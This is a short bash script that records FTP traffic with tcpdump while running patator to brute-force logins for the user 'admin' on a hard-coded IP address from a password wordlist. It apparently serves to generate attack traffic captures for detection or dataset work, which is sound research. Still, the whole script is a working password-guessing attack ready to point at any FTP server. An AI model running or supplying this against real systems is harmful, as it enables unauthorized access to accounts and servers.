#!/bin/bash

TARGET="205.174.165.68"
INTERFACE="eth0"
USER="admin"
WORDLIST="passwords.txt"
PCAP_FILE="pcap/bruteforce_ftp_$(date +%Y%m%d_%H%M%S).pcap"

if [[ ! -f "$WORDLIST" ]]; then
  echo "[!] Password list not found: $WORDLIST"
  exit 1
fi

echo "[*] Starting tcpdump to $PCAP_FILE..."
sudo tcpdump -i "$INTERFACE" host "$TARGET" and port 21 -w "$PCAP_FILE" &
TCPDUMP_PID=$!

patator ftp_login host="$TARGET" user="$USER" password=FILE0 0="$WORDLIST" -t 5

echo "[*] Stopping tcpdump..."
kill "$TCPDUMP_PID"

echo "[✅] FTP brute-force simulation complete. PCAP saved to $PCAP_FILE"
